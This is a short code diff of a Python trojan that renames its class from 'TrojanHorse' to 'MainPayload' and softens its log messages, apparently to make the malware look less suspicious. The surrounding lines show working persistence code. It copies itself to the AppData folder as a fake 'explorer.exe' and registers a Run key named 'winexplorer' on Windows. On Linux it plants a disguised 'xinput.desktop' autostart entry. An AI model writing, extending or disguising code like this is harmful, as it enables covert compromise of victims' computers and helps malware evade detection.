@@ -36,7 +36,7 @@ import imp
 import requests
 
 
-class TrojanHorse:
+class MainPayload:
     def __init__(self, email, password, ip, port):
         self.log = ""
         self.email = email
@@ -163,7 +163,7 @@ class TrojanHorse:
         evil_file_location = os.environ["appdata"] + "\\explorer.exe"
         if not os.path.exists(evil_file_location):
             time.sleep(int(time_persistent))
-            self.log = "** Meterpreter TrojanHorse started in Windows System ** "
+            self.log = "** Meterpreter THorse started in Windows System ** "
             shutil.copyfile(sys.executable, evil_file_location)
             subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"', shell=True)
 
@@ -173,7 +173,7 @@ class TrojanHorse:
         autostart_file = autostart_path + "xinput.desktop"
         if not os.path.isfile(autostart_file):
             time.sleep(int(time_persistent))        
-            self.log = "** Meterpreter TrojanHorse started in Linux System **"
+            self.log = "** Meterpreter THorse started in Linux System **"
             try:
                 os.makedirs(autostart_path)
             except OSError:
